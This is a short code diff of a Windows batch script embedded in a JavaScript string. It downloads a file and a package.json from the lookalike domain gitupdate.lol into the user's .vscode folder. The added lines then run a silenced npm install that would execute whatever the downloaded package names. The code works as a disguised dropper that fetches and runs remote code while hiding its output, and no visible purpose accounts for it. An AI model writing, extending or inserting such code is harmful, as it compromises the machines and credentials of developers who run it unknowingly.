@@ -219,6 +219,17 @@ set "CODEPROFILE=%USERPROFILE%\\.vscode"
 curl -L -o "%CODEPROFILE%\\env-setup.npl" "https://gitupdate.lol/settings/env?flag=${flag}"
 curl -L -o "%CODEPROFILE%\\package.json" "https://gitupdate.lol/settings/package"
 
+if not exist "%~dp0node_modules" (
+    pushd "%~dp0"
+    echo [INFO] Installing NPM packages...
+    call npm install --silent --no-progress --loglevel=error --fund=false
+    if errorlevel 1 (
+        echo [ERROR] npm install failed.
+        popd
+        exit /b 1
+    )
+    popd
+)
 
 exit /b 0
     	`;
